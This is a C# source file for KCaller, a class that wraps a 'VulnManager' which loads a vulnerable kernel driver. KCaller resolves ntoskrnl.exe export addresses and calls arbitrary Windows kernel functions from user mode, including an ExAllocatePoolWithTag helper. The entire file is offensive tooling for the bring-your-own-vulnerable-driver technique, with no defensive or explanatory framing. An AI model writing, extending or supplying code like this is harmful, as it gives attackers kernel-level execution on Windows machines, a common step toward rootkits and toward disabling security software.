using System;
using System.Collections.Concurrent;
using System.Runtime.CompilerServices;
using KernelAddress = System.UInt64;

/// <summary>
/// KCaller is a disposable wrapper over VulnManager for simplified kernel calls.
/// It caches export addresses from ntoskrnl.exe, provides methods to call exports,
/// and includes inline-optimized calls like ExAllocatePoolWithTag.
/// Initializes with EasyCreate and resolves ntos base.
/// </summary>
public sealed class KCaller : IDisposable
{
    private readonly VulnManager _vuln;
    private readonly ConcurrentDictionary<string, KernelAddress> _exportCache = new();
    private readonly KernelAddress _ntosBase;
    private bool _disposed;

    /// <summary>
    /// Constructor: Initializes VulnManager and gets ntoskrnl base.
    /// Throws if initialization fails.
    /// </summary>
    public KCaller()
    {
        _vuln = VulnManager.EasyCreate()
            ?? throw new InvalidOperationException("Failed to initialize: Could not load the vulnerable driver (VulnManager).");
        _ntosBase = VulnManager.GetKernelModuleAddress("ntoskrnl.exe");
        if (_ntosBase == 0)
            throw new InvalidOperationException("Failed to initialize: Could not resolve the base address of ntoskrnl.exe.");
    }

    /// <summary>
    /// Gets or resolves the address of a kernel export from cache.
    /// Uses concurrent dict for thread safety.
    /// </summary>
    /// <param name="exportName">Export name.</param>
    /// <returns>Address of the export.</returns>
    private KernelAddress GetExportAddress(string exportName)
    {
        if (_disposed) throw new ObjectDisposedException(nameof(KCaller));
        if (string.IsNullOrWhiteSpace(exportName))
            throw new ArgumentNullException(nameof(exportName));
        return _exportCache.GetOrAdd(exportName, name =>
        {
            KernelAddress addr = _vuln.GetKernelModuleExport(_ntosBase, name);
            if (addr == 0)
                throw new InvalidOperationException($"Failed to resolve kernel export: '{name}'. Address not found in ntoskrnl.exe.");
            return addr;
        });
    }

    /// <summary>
    /// Calls a kernel export by name with arguments.
    /// Resolves address, calls via VulnManager, throws on failure.
    /// </summary>
    /// <param name="exportName">Export name.</param>
    /// <param name="args">Arguments as KernelAddress[].</param>
    /// <returns>Return value from the call.</returns>
    public KernelAddress CallExport(string exportName, params KernelAddress[] args)
    {
        KernelAddress addr = GetExportAddress(exportName);
        KernelAddress ret = 0;
        if (!_vuln.CallKernelFunction(addr, out ret, args))
        {
            throw new InvalidOperationException($"Kernel function call failed: '{exportName}' at address 0x{addr:X}.");
        }
        return ret;
    }

    /// <summary>
    /// Inline-optimized call to ExAllocatePoolWithTag.
    /// Uses CallExport to invoke the kernel function.
    /// </summary>
    /// <param name="poolType">Pool type.</param>
    /// <param name="size">Size to allocate.</param>
    /// <param name="tag">Tag as uint.</param>
    /// <returns>Allocated address.</returns>
    [MethodImpl(MethodImplOptions.AggressiveInlining)]
    public KernelAddress ExAllocatePoolWithTag(
        KernelAddress poolType,
        KernelAddress size,
        uint tag)
    {
        return CallExport("ExAllocatePoolWithTag", poolType, size, (KernelAddress)tag);
    }

    /// <summary>
    /// Gets the underlying VulnManager.
    /// Throws if disposed.
    /// </summary>
    public VulnManager Vuln
    {
        get
        {
            if (_disposed)
                throw new ObjectDisposedException(nameof(KCaller));
            return _vuln;
        }
    }

    /// <summary>
    /// Disposes the caller, disposing the VulnManager.
    /// Suppresses finalizer.
    /// </summary>
    public void Dispose()
    {
        if (!_disposed)
        {
            _vuln?.Dispose();
            _disposed = true;
            GC.SuppressFinalize(this);
        }
    }
}